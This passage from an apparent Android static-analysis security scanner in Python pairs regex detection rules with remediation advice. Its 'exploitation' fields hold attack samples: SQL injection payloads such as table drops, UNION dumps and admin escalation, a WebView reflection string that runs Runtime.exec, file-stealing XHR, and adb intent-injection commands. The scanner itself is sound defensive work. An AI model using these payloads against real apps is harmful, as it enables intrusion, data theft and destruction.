        {"pattern": re.compile(r'Cipher\.getInstance\s*\(\s*["\']DES|Cipher\.getInstance\s*\(\s*["\']DESede', re.I), "title": "Weak DES/3DES Cipher", "severity": "high", "category": "Weak Cryptography", "cwe": "CWE-327",
         "exploitation": "DES/3DES are cryptographically broken", "remediation": "Use AES-256-GCM"},
        {"pattern": re.compile(r'Cipher\.getInstance\s*\(\s*["\']Blowfish|Cipher\.getInstance\s*\(\s*["\']RC[24]', re.I), "title": "Weak Cipher Algorithm", "severity": "high", "category": "Weak Cryptography", "cwe": "CWE-327"},
        {"pattern": re.compile(r'Cipher\.getInstance\s*\([^)]*ECB', re.I), "title": "ECB Mode Cipher", "severity": "high", "category": "Weak Cryptography", "cwe": "CWE-327",
         "exploitation": "ECB mode leaks patterns in ciphertext", "remediation": "Use CBC or GCM mode with random IV"},
        {"pattern": re.compile(r'Cipher\.getInstance\s*\([^)]*NoPadding', re.I), "title": "No Padding Cipher", "severity": "medium", "category": "Weak Cryptography", "cwe": "CWE-327"},
        {"pattern": re.compile(r'MessageDigest\.getInstance\s*\(\s*["\']MD5', re.I), "title": "MD5 Hash Usage", "severity": "medium", "category": "Weak Hash", "cwe": "CWE-328",
         "exploitation": "MD5 is collision-vulnerable", "remediation": "Use SHA-256 or SHA-3"},
        {"pattern": re.compile(r'MessageDigest\.getInstance\s*\(\s*["\']SHA-?1["\']', re.I), "title": "SHA-1 Hash Usage", "severity": "medium", "category": "Weak Hash", "cwe": "CWE-328"},
        {"pattern": re.compile(r'SecretKeySpec\s*\([^)]*,\s*["\']DES|SecretKeySpec\s*\([^)]*,\s*["\']Blowfish', re.I), "title": "Weak Key Spec", "severity": "high", "category": "Weak Cryptography", "cwe": "CWE-327"},
        {"pattern": re.compile(r'IvParameterSpec\s*\(\s*new\s+byte\s*\[\s*\d+\s*\]|IvParameterSpec\s*\(\s*["\']', re.I), "title": "Static/Zero IV", "severity": "high", "category": "Weak Cryptography", "cwe": "CWE-329",
         "exploitation": "Predictable IV enables pattern detection", "remediation": "Use SecureRandom for IV generation"},
        {"pattern": re.compile(r'new\s+Random\s*\(\s*\)|Random\s*\(\s*\d+\s*\)', re.I), "title": "Insecure Random", "severity": "medium", "category": "Weak Random", "cwe": "CWE-330",
         "remediation": "Use SecureRandom for security-sensitive operations"},
        {"pattern": re.compile(r'KeyGenerator\.getInstance\s*\([^)]+\)\.init\s*\(\s*\d{1,2}\s*\)', re.I), "title": "Small Key Size", "severity": "high", "category": "Weak Cryptography", "cwe": "CWE-326"},
    ]
    
    ssl_patterns = [
        {"pattern": re.compile(r'TrustAllCertificates|AllowAllHostnameVerifier|ALLOW_ALL_HOSTNAME_VERIFIER', re.I), "title": "SSL/TLS Validation Bypass", "severity": "critical", "category": "SSL Bypass", "cwe": "CWE-295",
         "exploitation": "Allows MitM attacks on HTTPS connections", "remediation": "Use proper certificate validation"},
        {"pattern": re.compile(r'setHostnameVerifier\s*\([^)]*ALLOW_ALL|setHostnameVerifier\s*\(\s*\(\s*hostname', re.I), "title": "Hostname Verifier Bypass", "severity": "critical", "category": "SSL Bypass", "cwe": "CWE-295"},
        {"pattern": re.compile(r'checkServerTrusted[^}]*\{\s*\}|checkClientTrusted[^}]*\{\s*\}', re.I | re.S), "title": "Empty TrustManager", "severity": "critical", "category": "SSL Bypass", "cwe": "CWE-295"},
        {"pattern": re.compile(r'X509TrustManager[^}]*return\s+null|getAcceptedIssuers[^}]*return\s+null', re.I | re.S), "title": "Null Certificate Validation", "severity": "critical", "category": "SSL Bypass", "cwe": "CWE-295"},
        {"pattern": re.compile(r'SSLContext\.getInstance\s*\(\s*["\']SSL["\']|SSLContext\.getInstance\s*\(\s*["\']TLS["\'](?!\s*v)', re.I), "title": "Outdated SSL/TLS Protocol", "severity": "medium", "category": "Weak TLS", "cwe": "CWE-326"},
        {"pattern": re.compile(r'\.usesCleartextTraffic\s*=\s*true|android:usesCleartextTraffic\s*=\s*["\']true', re.I), "title": "Cleartext Traffic Allowed", "severity": "medium", "category": "Network Security", "cwe": "CWE-319"},
    ]
    
    sqli_patterns = [
        {"pattern": re.compile(r'rawQuery\s*\(\s*[^,]*\+\s*[a-zA-Z]', re.I), "title": "SQL Injection (rawQuery)", "severity": "critical", "category": "SQL Injection", "cwe": "CWE-89",
         "exploitation": "Unsanitized input concatenated into SQL query", "remediation": "Use parameterized queries with ? placeholders"},
        {"pattern": re.compile(r'execSQL\s*\(\s*[^)]*\+\s*[a-zA-Z]', re.I), "title": "SQL Injection (execSQL)", "severity": "critical", "category": "SQL Injection", "cwe": "CWE-89"},
        {"pattern": re.compile(r'query\s*\([^)]*\+\s*["\']', re.I), "title": "Potential SQL Injection", "severity": "high", "category": "SQL Injection", "cwe": "CWE-89"},
        {"pattern": re.compile(r'compileStatement\s*\(\s*[^)]*\+', re.I), "title": "SQL Injection (compileStatement)", "severity": "high", "category": "SQL Injection", "cwe": "CWE-89"},
    ]
    
    injection_patterns = [
        {"pattern": re.compile(r'Runtime\.getRuntime\s*\(\s*\)\.exec\s*\([^)]*\+', re.I), "title": "Command Injection", "severity": "critical", "category": "Command Injection", "cwe": "CWE-78",
         "exploitation": "User input in shell command allows RCE", "remediation": "Avoid exec() or use strict input validation"},
        {"pattern": re.compile(r'ProcessBuilder\s*\([^)]*\+', re.I), "title": "Command Injection (ProcessBuilder)", "severity": "critical", "category": "Command Injection", "cwe": "CWE-78"},
        {"pattern": re.compile(r'\.exec\s*\(\s*["\']sh\s*-c|\.exec\s*\(\s*["\']bash', re.I), "title": "Shell Command Execution", "severity": "high", "category": "Command Injection", "cwe": "CWE-78"},
        {"pattern": re.compile(r'DexClassLoader|PathClassLoader|URLClassLoader', re.I), "title": "Dynamic Class Loading", "severity": "high", "category": "Code Injection", "cwe": "CWE-470"},
        {"pattern": re.compile(r'Class\.forName\s*\([^)]*\+|loadClass\s*\([^)]*\+', re.I), "title": "Dynamic Class Loading from Input", "severity": "high", "category": "Code Injection", "cwe": "CWE-470"},
    ]
    
    intent_patterns = [
        {"pattern": re.compile(r'startActivity\s*\([^)]*getIntent', re.I), "title": "Intent Forwarding", "severity": "high", "category": "Intent Injection", "cwe": "CWE-927",
         "exploitation": "Forwards untrusted intents to other activities", "remediation": "Validate intent data before forwarding"},
        {"pattern": re.compile(r'startService\s*\([^)]*getIntent', re.I), "title": "Service Start from Intent", "severity": "high", "category": "Intent Injection", "cwe": "CWE-927"},
        {"pattern": re.compile(r'sendBroadcast\s*\([^)]*getIntent|sendOrderedBroadcast\s*\([^)]*getIntent', re.I), "title": "Broadcast from Untrusted Intent", "severity": "high", "category": "Intent Injection", "cwe": "CWE-927"},
        {"pattern": re.compile(r'getIntent\s*\(\s*\)\.get(Data|StringExtra|IntExtra|BooleanExtra|ParcelableExtra)', re.I), "title": "Intent Data Usage", "severity": "low", "category": "Intent Handling", "cwe": "CWE-927"},
        {"pattern": re.compile(r'PendingIntent\.get(Activity|Service|Broadcast)\s*\([^)]*,\s*0\s*\)', re.I), "title": "Mutable PendingIntent", "severity": "medium", "category": "Intent Security", "cwe": "CWE-927"},
    ]
    
    file_patterns = [
        {"pattern": re.compile(r'MODE_WORLD_READABLE|MODE_WORLD_WRITEABLE', re.I), "title": "World-Accessible File", "severity": "critical", "category": "File Security", "cwe": "CWE-732",
         "exploitation": "Any app can read/write this file", "remediation": "Use MODE_PRIVATE"},
        {"pattern": re.compile(r'getExternalStorageDirectory|getExternalFilesDir|getExternalCacheDir', re.I), "title": "External Storage Usage", "severity": "medium", "category": "Data Storage", "cwe": "CWE-922"},
        {"pattern": re.compile(r'new\s+File\s*\([^)]*\+[^)]*getIntent|openFileOutput\s*\([^)]*\+', re.I), "title": "Path Traversal Risk", "severity": "high", "category": "Path Traversal", "cwe": "CWE-22",
         "exploitation": "User input in file path enables path traversal", "remediation": "Validate file paths, block .. sequences"},
        {"pattern": re.compile(r'new\s+FileInputStream\s*\([^)]*\+|new\s+FileOutputStream\s*\([^)]*\+', re.I), "title": "Dynamic File Path", "severity": "medium", "category": "Path Traversal", "cwe": "CWE-22"},
        {"pattern": re.compile(r'\.createTempFile\s*\([^)]*,\s*null\s*\)', re.I), "title": "Temp File in Default Dir", "severity": "low", "category": "File Security", "cwe": "CWE-377"},
        {"pattern": re.compile(r'ZipInputStream|ZipEntry', re.I), "title": "Zip File Handling", "severity": "low", "category": "Zip Slip Risk", "cwe": "CWE-22"},
    ]
    
    auth_patterns = [
        {"pattern": re.compile(r'password\s*=\s*["\'][^"\']{4,}["\']', re.I), "title": "Hardcoded Password", "severity": "critical", "category": "Hardcoded Secrets", "cwe": "CWE-798",
         "exploitation": "Extract credentials from APK decompilation", "remediation": "Use Android Keystore or secure input"},
        {"pattern": re.compile(r'api[_-]?key\s*=\s*["\'][A-Za-z0-9_-]{16,}["\']', re.I), "title": "Hardcoded API Key", "severity": "high", "category": "Hardcoded Secrets", "cwe": "CWE-798"},
        {"pattern": re.compile(r'(secret|token|auth)[_-]?(key|token)?\s*=\s*["\'][^"\']{8,}["\']', re.I), "title": "Hardcoded Secret", "severity": "high", "category": "Hardcoded Secrets", "cwe": "CWE-798"},
        {"pattern": re.compile(r'private[_-]?key\s*=\s*["\']|BEGIN\s+(RSA\s+)?PRIVATE\s+KEY', re.I), "title": "Hardcoded Private Key", "severity": "critical", "category": "Hardcoded Secrets", "cwe": "CWE-798"},
        {"pattern": re.compile(r'AWS[_-]?(ACCESS|SECRET)[_-]?KEY|AKIA[0-9A-Z]{16}', re.I), "title": "AWS Credentials", "severity": "critical", "category": "Hardcoded Secrets", "cwe": "CWE-798"},
        {"pattern": re.compile(r'firebase[_-]?(api[_-]?key|secret)|AIza[0-9A-Za-z_-]{35}', re.I), "title": "Firebase Key", "severity": "high", "category": "Hardcoded Secrets", "cwe": "CWE-798"},
    ]
    
    logging_patterns = [
        {"pattern": re.compile(r'Log\.[vdiwe]\s*\([^)]*password|Log\.[vdiwe]\s*\([^)]*token|Log\.[vdiwe]\s*\([^)]*secret', re.I), "title": "Sensitive Data in Logs", "severity": "high", "category": "Information Disclosure", "cwe": "CWE-532"},
        {"pattern": re.compile(r'System\.out\.print|System\.err\.print', re.I), "title": "Debug Print Statement", "severity": "low", "category": "Information Disclosure", "cwe": "CWE-532"},
        {"pattern": re.compile(r'\.printStackTrace\s*\(\s*\)', re.I), "title": "Stack Trace Exposure", "severity": "low", "category": "Information Disclosure", "cwe": "CWE-209"},
        {"pattern": re.compile(r'android\.util\.Log\..*BuildConfig\.DEBUG', re.I), "title": "Debug Logging Check", "severity": "info", "category": "Good Practice", "cwe": "N/A"},
    ]
    
    provider_patterns = [
        {"pattern": re.compile(r'android:exported\s*=\s*["\']true["\']', re.I), "title": "Exported Component", "severity": "medium", "category": "Component Security", "cwe": "CWE-926"},
        {"pattern": re.compile(r'android:permission\s*=\s*["\']["\']|android:permission\s*=\s*""', re.I), "title": "Empty Permission", "severity": "high", "category": "Component Security", "cwe": "CWE-926"},
        {"pattern": re.compile(r'grantUriPermission|FLAG_GRANT_READ_URI_PERMISSION|FLAG_GRANT_WRITE_URI_PERMISSION', re.I), "title": "URI Permission Grant", "severity": "medium", "category": "Content Provider", "cwe": "CWE-926"},
        {"pattern": re.compile(r'content://[a-zA-Z0-9._-]+/', re.I), "title": "Content Provider URI", "severity": "low", "category": "Data Access", "cwe": "CWE-926"},
    ]
    
    # Combine all patterns with their scanner names
    all_patterns = []
    for p in webview_patterns: p["scanner"] = "webview"; all_patterns.append(p)
    for p in crypto_patterns: p["scanner"] = "crypto"; all_patterns.append(p)
    for p in ssl_patterns: p["scanner"] = "ssl"; all_patterns.append(p)
    for p in sqli_patterns: p["scanner"] = "sqli"; all_patterns.append(p)
    for p in injection_patterns: p["scanner"] = "injection"; all_patterns.append(p)
    for p in intent_patterns: p["scanner"] = "intent"; all_patterns.append(p)
    for p in file_patterns: p["scanner"] = "file"; all_patterns.append(p)
    for p in auth_patterns: p["scanner"] = "auth"; all_patterns.append(p)
    for p in logging_patterns: p["scanner"] = "logging"; all_patterns.append(p)
    for p in provider_patterns: p["scanner"] = "provider"; all_patterns.append(p)
    
    logger.info(f"Single-pass scanner loaded {len(all_patterns)} patterns")
    
    files_scanned = 0
    test_files_skipped = 0  # FIX #3: Track skipped test files
    log_interval = max(len(files) // 10, 100)
    
    for file_path in files:
        try:
            # FIX #3: Skip test files to reduce false positives
            if _is_test_file(file_path):
                test_files_skipped += 1
                continue
            
            content = file_path.read_text(encoding='utf-8', errors='ignore')
            
            if len(content) < 50:
                continue
                
            lines = content.split('\n')
            rel_path = str(file_path.relative_to(sources_dir))
            class_name = file_path.stem
            
            # Quick pre-filter for webview patterns
            has_webview = 'WebView' in content or 'webView' in content
            
            for p in all_patterns:
                # Skip webview patterns for files without WebView
                if p["scanner"] == "webview" and not has_webview:
                    continue
                    
                for match in p["pattern"].finditer(content):
                    # FIX #3: Skip findings in comments
                    if _is_in_comment(content, match.start()):
                        continue
                    
                    line_num = content[:match.start()].count('\n') + 1
                    line_idx = line_num - 1
                    
                    # FIX #3: Calculate confidence based on context
                    confidence = _get_code_context_confidence(content, match.start(), match.end(), rel_path)
                    
                    start_ctx = max(0, line_idx - 2)
                    end_ctx = min(len(lines), line_idx + 3)
                    current = lines[line_idx] if line_idx < len(lines) else ""
                    
                    findings.append({
                        "scanner": p["scanner"],
                        "category": p["category"],
                        "severity": p["severity"],
                        "title": p["title"],
                        "cwe_id": p.get("cwe", "N/A"),
                        "class_name": class_name,
                        "file_path": rel_path,
                        "line_number": line_num,
                        "code_snippet": current.strip()[:200],
                        "context_before": "\n".join(lines[start_ctx:line_idx]),
                        "context_after": "\n".join(lines[line_idx+1:end_ctx]),
                        "exploitation": p.get("exploitation", ""),
                        "remediation": p.get("remediation", ""),
                        "confidence": confidence,  # FIX #3: Add confidence based on context
                    })
            
            files_scanned += 1
            if files_scanned % log_interval == 0:
                logger.info(f"Code scan progress: {files_scanned}/{len(files)} files ({100*files_scanned//len(files)}%)")
                
        except Exception:
            continue
    
    elapsed = time.time() - start
    # FIX #3: Log skipped test files
    logger.info(f"Single-pass scan complete: {len(findings)} findings from {files_scanned} files in {elapsed:.1f}s (skipped {test_files_skipped} test files)")
    return findings


def _get_code_context(lines: List[str], line_idx: int, context_lines: int = 3) -> Tuple[str, str, str]:
    """Get code context around a finding."""
    start = max(0, line_idx - context_lines)
    end = min(len(lines), line_idx + context_lines + 1)
    
    before = "\n".join(lines[start:line_idx])
    current = lines[line_idx] if line_idx < len(lines) else ""
    after = "\n".join(lines[line_idx + 1:end])
    
    return before, current.strip(), after


def _scan_webview_security(files: List[Path], sources_dir: Path) -> List[Dict[str, Any]]:
    """Scan for WebView security vulnerabilities - XSS, RCE, file access."""
    findings = []
    
    patterns = [
        # JavaScript Interface - RCE on API < 17
        {
            "pattern": r'addJavascriptInterface\s*\(',
            "title": "WebView JavaScript Interface",
            "severity": "critical",
            "category": "Remote Code Execution",
            "cwe": "CWE-749",
            "description": "JavaScript interface exposed to WebView allows JavaScript to call Java methods",
            "exploitation": """1. If app targets API < 17, any JavaScript can use reflection to execute arbitrary code:
   - Inject JS: Android.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('command')
2. For API >= 17, only @JavascriptInterface methods are exposed, but still check what methods are available
3. Use MitM to inject malicious JavaScript if loading HTTP content""",
            "remediation": "Remove JavaScript interfaces if possible. If required, use @JavascriptInterface annotation and validate all inputs. Never load untrusted content."
        },
        # JavaScript enabled with file access
        {
            "pattern": r'setJavaScriptEnabled\s*\(\s*true\s*\)',
            "title": "WebView JavaScript Enabled",
            "severity": "medium",
            "category": "Cross-Site Scripting",
            "cwe": "CWE-79",
            "description": "JavaScript is enabled in WebView which can lead to XSS if loading untrusted content",
            "exploitation": """1. Find where WebView loads content - look for loadUrl(), loadData(), loadDataWithBaseURL()
2. If loading user-controlled URLs or data, inject <script> tags
3. Combined with file:// access, can steal local files""",
            "remediation": "Disable JavaScript unless absolutely required. Implement Content Security Policy. Validate all URLs before loading."
        },
        # Universal file access - critical
        {
            "pattern": r'setAllowUniversalAccessFromFileURLs\s*\(\s*true\s*\)',
            "title": "WebView Universal File Access",
            "severity": "critical",
            "category": "Local File Inclusion",
            "cwe": "CWE-200",
            "description": "WebView allows JavaScript from file:// URLs to access content from any origin including other file:// URLs",
            "exploitation": """1. Craft malicious HTML file and get it onto device (download, share intent, etc)
2. Open the file in the vulnerable WebView
3. JavaScript can now read ANY file: var x=new XMLHttpRequest();x.open('GET','file:///data/data/app/shared_prefs/secrets.xml');
4. Exfiltrate data via XHR to attacker server""",
            "remediation": "Never enable this setting. Use setAllowUniversalAccessFromFileURLs(false) explicitly."
        },
        # File access from file URLs
        {
            "pattern": r'setAllowFileAccessFromFileURLs\s*\(\s*true\s*\)',
            "title": "WebView File URL Access",
            "severity": "high",
            "category": "Local File Inclusion", 
            "cwe": "CWE-200",
            "description": "WebView allows JavaScript from file:// URLs to access other file:// URLs",
            "exploitation": """1. Similar to universal file access but limited to file:// protocol
2. Can still read app's private files if malicious HTML gets into app's directory
3. Combine with path traversal or symlink attacks""",
            "remediation": "Disable with setAllowFileAccessFromFileURLs(false). Avoid loading file:// URLs with JavaScript enabled."
        },
        # File access enabled
        {
            "pattern": r'setAllowFileAccess\s*\(\s*true\s*\)',
            "title": "WebView File Access Enabled",
            "severity": "medium",
            "category": "Local File Access",
            "cwe": "CWE-200",
            "description": "WebView can access file:// URLs",
            "exploitation": """1. If WebView loads user-controlled URLs, try file:///data/data/package/files/sensitive.txt
2. Can read app's private files if combined with other vulns""",
            "remediation": "Disable file access with setAllowFileAccess(false) unless specifically required."
        },
        # Loading URLs from intents - injection
        {
            "pattern": r'loadUrl\s*\(\s*.*getIntent\s*\(\s*\).*getData|loadUrl\s*\(\s*.*getStringExtra',
            "title": "WebView URL from Intent",
            "severity": "critical",
            "category": "Intent Injection",
            "cwe": "CWE-940",
            "description": "WebView loads URLs from untrusted intent data without validation",
            "exploitation": """1. Send malicious intent: adb shell am start -n package/.Activity -d "javascript:alert(document.cookie)"
2. Try file:// URLs to read local files
3. Try data: URLs with JavaScript""",
            "remediation": "Validate URLs before loading. Whitelist allowed schemes (https only). Never load javascript: or file: URLs from intents."
        },
        # evaluateJavascript with dynamic content
        {
            "pattern": r'evaluateJavascript\s*\([^"]*\+|evaluateJavascript\s*\(\s*[a-zA-Z_][a-zA-Z0-9_]*\s*[,\)]',
            "title": "Dynamic JavaScript Evaluation",
            "severity": "high",
            "category": "Cross-Site Scripting",
            "cwe": "CWE-95",
            "description": "WebView evaluates dynamically constructed JavaScript",
            "exploitation": """1. Find where the JavaScript string is constructed
2. If any part comes from user input, inject: '); malicious_code(); //
3. Can steal cookies, tokens, or perform actions as the user""",
            "remediation": "Never construct JavaScript from user input. Use JSON.stringify() for data passing. Implement proper escaping."
        },
    ]
    
    for file_path in files:
        try:
            content = file_path.read_text(encoding='utf-8', errors='ignore')
            lines = content.split('\n')
            rel_path = str(file_path.relative_to(sources_dir))
            class_name = file_path.stem
            
            # Check if this file uses WebView
            if 'WebView' not in content and 'webView' not in content:
                continue
            
            for p in patterns:
                for match in re.finditer(p["pattern"], content, re.IGNORECASE):
                    # Find line number
                    line_num = content[:match.start()].count('\n') + 1
                    line_idx = line_num - 1
                    
                    before, current, after = _get_code_context(lines, line_idx)
                    
                    findings.append({
                        "scanner": "webview_security",
                        "category": p["category"],
                        "severity": p["severity"],
                        "title": p["title"],
                        "description": p["description"],
                        "class_name": class_name,
                        "file_path": rel_path,
                        "line_number": line_num,
                        "code_snippet": current,
                        "context_before": before,
                        "context_after": after,
                        "exploitation": p["exploitation"],
                        "remediation": p["remediation"],
                        "cwe_id": p.get("cwe"),
                        "confidence": "high",
                    })
        except Exception as e:
            logger.debug(f"Error scanning {file_path}: {e}")
    
    return findings


def _scan_crypto_weaknesses(files: List[Path], sources_dir: Path) -> List[Dict[str, Any]]:
    """Scan for cryptographic weaknesses - weak algorithms, hardcoded keys, bad IVs."""
    findings = []
    
    patterns = [
        {
            "pattern": r'Cipher\.getInstance\s*\(\s*["\']DES["\']',
            "title": "DES Encryption Used",
            "severity": "high",
            "category": "Weak Cryptography",
            "cwe": "CWE-327",
            "description": "DES encryption is obsolete and can be broken with modern hardware",
            "exploitation": "DES uses 56-bit keys which can be brute-forced. Use hashcat or specialized hardware to crack.",
            "remediation": "Replace with AES-256-GCM or ChaCha20-Poly1305"
        },
        {
            "pattern": r'Cipher\.getInstance\s*\(\s*["\']AES/ECB',
            "title": "AES ECB Mode Used",
            "severity": "high", 
            "category": "Weak Cryptography",
            "cwe": "CWE-327",
            "description": "ECB mode encrypts identical plaintext blocks to identical ciphertext, leaking patterns",
            "exploitation": "Analyze ciphertext for repeating blocks. ECB penguin attack can reveal image contents.",
            "remediation": "Use AES-GCM or AES-CBC with random IV"
        },
        {
            "pattern": r'Cipher\.getInstance\s*\(\s*["\']AES["\']\s*\)',
            "title": "AES Without Mode Specified",
            "severity": "medium",
            "category": "Weak Cryptography", 
            "cwe": "CWE-327",
            "description": "AES without explicit mode defaults to ECB in many implementations",
            "exploitation": "Check if ECB is actually used, then apply ECB attacks",
            "remediation": "Explicitly specify AES/GCM/NoPadding or AES/CBC/PKCS5Padding"
        },
        {
            "pattern": r'MessageDigest\.getInstance\s*\(\s*["\']MD5["\']',
            "title": "MD5 Hash Used",
            "severity": "high",
            "category": "Weak Cryptography",
            "cwe": "CWE-328",
            "description": "MD5 is cryptographically broken - collisions can be generated in seconds",
            "exploitation": "If used for integrity checks, create collision. If for passwords, use rainbow tables or hashcat.",
            "remediation": "Use SHA-256 or SHA-3 for integrity, bcrypt/scrypt/argon2 for passwords"
        },
        {
            "pattern": r'MessageDigest\.getInstance\s*\(\s*["\']SHA-?1["\']',
            "title": "SHA-1 Hash Used",
            "severity": "medium",
            "category": "Weak Cryptography",
            "cwe": "CWE-328",
            "description": "SHA-1 is deprecated - collision attacks are practical",
            "exploitation": "Collision attacks possible with significant compute resources. Not suitable for security.",
            "remediation": "Use SHA-256 or SHA-3"
        },
        {
            "pattern": r'new\s+Random\s*\(\s*\)',
            "title": "Insecure Random Number Generator",
            "severity": "high",
            "category": "Weak Cryptography",
            "cwe": "CWE-330",
            "description": "java.util.Random is not cryptographically secure - output is predictable",
            "exploitation": "Given enough outputs, the internal state can be recovered and future values predicted.",
            "remediation": "Use SecureRandom for any security-sensitive randomness"
        },
        {
            "pattern": r'SecretKeySpec\s*\(\s*["\'][^"\']+["\']\.getBytes',
            "title": "Hardcoded Encryption Key",
            "severity": "critical",
            "category": "Key Management",
            "cwe": "CWE-321",
            "description": "Encryption key is hardcoded in source code",
            "exploitation": "Extract the key from decompiled code and decrypt all data encrypted with it.",
            "remediation": "Use Android Keystore for key storage. Derive keys from user input with PBKDF2/scrypt."
        },
        {
            "pattern": r'IvParameterSpec\s*\(\s*new\s+byte\s*\[\s*\]\s*\{[0,\s]+\}',
            "title": "Static/Zero IV Used",
            "severity": "critical",
            "category": "Weak Cryptography",
            "cwe": "CWE-329",
            "description": "Using a static or zero IV breaks the security of CBC and other modes",
            "exploitation": "With static IV, identical plaintexts produce identical ciphertexts. Enables pattern analysis.",
            "remediation": "Generate random IV with SecureRandom for each encryption operation"
        },
        {
            "pattern": r'IvParameterSpec\s*\(\s*["\'][^"\']+["\']\.getBytes',
            "title": "Hardcoded IV",
            "severity": "critical",
            "category": "Weak Cryptography",
            "cwe": "CWE-329",
            "description": "Initialization vector is hardcoded",
            "exploitation": "Static IV allows pattern analysis and may enable decryption without key in some modes.",
            "remediation": "Generate random IV with SecureRandom, prepend to ciphertext"
        },
        {
            "pattern": r'PBEKeySpec\s*\([^,]+,\s*[^,]+,\s*(\d+)\s*[,\)]',
            "title": "Weak PBKDF Iterations",
            "severity": "medium",
            "category": "Weak Cryptography",
            "cwe": "CWE-916",
            "description": "Password-based key derivation may use insufficient iterations",
            "exploitation": "Low iteration counts allow faster brute-force attacks on passwords.",
            "remediation": "Use at least 100,000 iterations for PBKDF2, or switch to bcrypt/scrypt/argon2"
        },
    ]
    
    for file_path in files:
        try:
            content = file_path.read_text(encoding='utf-8', errors='ignore')
            lines = content.split('\n')
            rel_path = str(file_path.relative_to(sources_dir))
            class_name = file_path.stem
            
            # Quick check for crypto-related content
            if not any(x in content for x in ['Cipher', 'MessageDigest', 'SecretKey', 'Random', 'KeySpec']):
                continue
            
            for p in patterns:
                for match in re.finditer(p["pattern"], content, re.IGNORECASE):
                    line_num = content[:match.start()].count('\n') + 1
                    line_idx = line_num - 1
                    before, current, after = _get_code_context(lines, line_idx)
                    
                    findings.append({
                        "scanner": "crypto_weakness",
                        "category": p["category"],
                        "severity": p["severity"],
                        "title": p["title"],
                        "description": p["description"],
                        "class_name": class_name,
                        "file_path": rel_path,
                        "line_number": line_num,
                        "code_snippet": current,
                        "context_before": before,
                        "context_after": after,
                        "exploitation": p["exploitation"],
                        "remediation": p["remediation"],
                        "cwe_id": p.get("cwe"),
                        "confidence": "high",
                    })
        except Exception as e:
            logger.debug(f"Error scanning {file_path}: {e}")
    
    return findings


def _scan_sql_injection(files: List[Path], sources_dir: Path) -> List[Dict[str, Any]]:
    """Scan for SQL injection vulnerabilities."""
    findings = []
    
    patterns = [
        {
            "pattern": r'rawQuery\s*\(\s*[^,]*\+\s*[a-zA-Z]',
            "title": "SQL Injection in rawQuery",
            "severity": "critical",
            "category": "SQL Injection",
            "cwe": "CWE-89",
            "description": "String concatenation used in rawQuery - classic SQL injection",
            "exploitation": """1. Find the input source (intent extra, user input, etc)
2. Inject: ' OR '1'='1' -- to bypass conditions
3. Inject: ' UNION SELECT * FROM sqlite_master -- to dump schema
4. Extract data with UNION-based or blind injection""",
            "remediation": "Use parameterized queries: rawQuery('SELECT * FROM t WHERE id=?', new String[]{id})"
        },
        {
            "pattern": r'execSQL\s*\(\s*[^,]*\+\s*[a-zA-Z]',
            "title": "SQL Injection in execSQL",
            "severity": "critical",
            "category": "SQL Injection",
            "cwe": "CWE-89",
            "description": "String concatenation used in execSQL",
            "exploitation": """1. execSQL doesn't return results but can still modify data
2. Inject: '; DROP TABLE users; -- 
3. Inject: '; UPDATE users SET admin=1 WHERE username='attacker'; --""",
            "remediation": "Use parameterized queries or prepared statements"
        },
        {
            "pattern": r'query\s*\([^,]+,\s*[^,]+,\s*[^,]*\+\s*[a-zA-Z]',
            "title": "SQL Injection in query()",
            "severity": "high",
            "category": "SQL Injection", 
            "cwe": "CWE-89",
            "description": "String concatenation in query selection args",
            "exploitation": "Similar to rawQuery injection techniques",
            "remediation": "Pass user input as selectionArgs parameter, not concatenated into selection string"
        },
        {
            "pattern": r'compileStatement\s*\(\s*[^)]*\+',
            "title": "SQL Injection in compileStatement",
            "severity": "high",
            "category": "SQL Injection",
            "cwe": "CWE-89",
            "description": "Dynamic SQL in compiled statement",
            "exploitation": "Inject SQL through the concatenated portion",
            "remediation": "Use placeholders (?) and bind values with bindString(), bindLong(), etc."
        },
    ]
    
    for file_path in files:
        try:
            content = file_path.read_text(encoding='utf-8', errors='ignore')
            lines = content.split('\n')
            rel_path = str(file_path.relative_to(sources_dir))
            class_name = file_path.stem
            
            if not any(x in content for x in ['rawQuery', 'execSQL', 'SQLite', 'query(', 'compileStatement']):
                continue
            
            for p in patterns:
                for match in re.finditer(p["pattern"], content):
                    line_num = content[:match.start()].count('\n') + 1
                    line_idx = line_num - 1
                    before, current, after = _get_code_context(lines, line_idx)
                    
                    findings.append({
                        "scanner": "sql_injection",
                        "category": p["category"],
                        "severity": p["severity"],
                        "title": p["title"],
                        "description": p["description"],
                        "class_name": class_name,
                        "file_path": rel_path,
                        "line_number": line_num,
                        "code_snippet": current,
                        "context_before": before,
                        "context_after": after,
                        "exploitation": p["exploitation"],
                        "remediation": p["remediation"],
                        "cwe_id": p.get("cwe"),
                        "confidence": "high",
                    })
        except Exception as e:
            logger.debug(f"Error scanning {file_path}: {e}")
    
    return findings


def _scan_intent_injection(files: List[Path], sources_dir: Path) -> List[Dict[str, Any]]:
    """Scan for intent injection and IPC vulnerabilities."""
    findings = []
    
    patterns = [
        {
            "pattern": r'getIntent\s*\(\s*\)\.get(String|Int|Boolean|Parcelable|Serializable)Extra',
            "title": "Intent Extra Used Without Validation",
            "severity": "medium",
            "category": "Intent Injection",
            "cwe": "CWE-940",
            "description": "Data from intent extras used without validation",
            "exploitation": """1. Send malicious intent: adb shell am start -n pkg/.Activity --es key "malicious_value"
2. If used in file paths, try path traversal: ../../../data/data/other.app/
3. If used in URLs, inject javascript: or file:// schemes""",
            "remediation": "Validate all intent extras. Check caller with getCallingPackage(). Use explicit intents."
        },
        {
            "pattern": r'getIntent\s*\(\s*\)\.getData\s*\(\s*\)',
            "title": "Intent Data URI Used",
            "severity": "medium",
            "category": "Intent Injection",
            "cwe": "CWE-940", 
            "description": "URI data from intent used - potential injection point",
            "exploitation": """1. If activity is exported, send intent with malicious URI
2. Try different schemes: file://, javascript:, content://
3. Path traversal: content://provider/../../private_file""",
            "remediation": "Validate URI scheme and host. Whitelist allowed content providers."
        },
        {
            "pattern": r'PendingIntent\.get(Activity|Service|Broadcast)\s*\([^,]+,\s*[^,]+,\s*[^,]+,\s*0\s*\)',
            "title": "Mutable PendingIntent",
            "severity": "high",
            "category": "Intent Hijacking",
            "cwe": "CWE-927",
            "description": "PendingIntent created without FLAG_IMMUTABLE can be modified by recipient",
            "exploitation": """1. Intercept the PendingIntent (if broadcast or accessible)
2. Modify the base intent to point to attacker's component
3. Trigger the PendingIntent to execute attacker's code with victim's permissions""",
            "remediation": "Always use FLAG_IMMUTABLE unless you specifically need FLAG_MUTABLE"
        },
        {
